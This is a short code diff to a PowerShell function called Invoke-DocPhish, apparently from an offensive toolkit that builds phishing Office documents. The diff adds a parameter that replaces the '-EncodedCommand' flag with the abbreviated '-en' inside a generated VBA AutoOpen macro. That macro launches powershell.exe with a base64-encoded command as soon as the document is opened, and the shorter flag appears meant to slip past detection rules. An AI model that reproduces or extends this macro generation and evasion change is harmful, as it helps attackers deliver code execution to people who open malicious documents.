@@ -123,6 +123,9 @@ function Invoke-DocPhish {
         [string]$ExeName = "168",
 
         [Parameter(Mandatory = $False)]
+        [string]$EncodedFlag = "-en",
+        
+        [Parameter(Mandatory = $False)]
         [string]$ExePath = $( if ($IsLinux -or $IsMacOS) { $Env:HOME } else { $env:temp }),
 
         [Parameter(Mandatory = $False)]
@@ -166,7 +169,7 @@ function Invoke-DocPhish {
         Write-Verbose "Command Executed by Macro: $Command"
         $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
         $EncodedCommand = [Convert]::ToBase64String($Bytes)
-        $macrocode = "Sub AutoOpen() `n`n    Shell `"powershell.exe -EncodedCommand $EncodedCommand`" `nEnd Sub"
+        $macrocode = "Sub AutoOpen() `n`n    Shell `"powershell.exe $EncodedFlag $EncodedCommand`" `nEnd Sub"
 
         #Cleanup
         Write-Verbose "Cleaning up old files if they exist"
